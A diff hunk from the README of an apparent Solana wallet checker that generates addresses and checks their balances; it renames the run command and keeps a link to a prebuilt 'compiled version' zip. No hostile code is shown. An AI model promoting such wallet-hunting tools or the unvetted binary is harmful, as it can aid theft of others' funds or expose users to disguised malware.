@@ -25,7 +25,7 @@ This Python script automatically generates new Solana addresses, checks their ba
    ```
 3. **Run the script**:
    ```bash
-   python script.py
+   python sol_checker.py
    ```
    Compiled version https://github.com/Tieuvanna/solana-wallet-checker/releases/download/check-sol/sol-checker.zip
 
